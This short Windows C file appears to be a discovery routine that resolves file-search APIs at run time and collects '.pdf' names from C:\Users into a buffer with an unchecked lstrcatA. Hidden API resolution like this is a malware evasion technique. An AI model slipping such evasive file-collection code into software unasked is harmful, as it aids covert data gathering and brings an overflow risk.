#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(char* res){
    HMODULE k = GetModuleHandleA("kernel32.dll");
    typedef HANDLE(WINAPI* FFF)(LPCSTR, LPWIN32_FIND_DATAA);
    typedef BOOL(WINAPI* FNF)(HANDLE, LPWIN32_FIND_DATAA);
    typedef BOOL(WINAPI* FC)(HANDLE);
    FFF _fff = (FFF)GetProcAddress(k, "FindFirstFileA");
    FNF _fnf = (FNF)GetProcAddress(k, "FindNextFileA");
    FC _fc = (FC)GetProcAddress(k, "FindClose");
    WIN32_FIND_DATAA d;
    HANDLE h = _fff("C:\\Users\\*.*", &d);
    if (h != (HANDLE)-1) {
        do {
            if (strstr(d.cFileName, ".pdf")) {
                lstrcatA(res, d.cFileName);
            }
        } while (_fnf(h, &d));
        _fc(h);
    }
}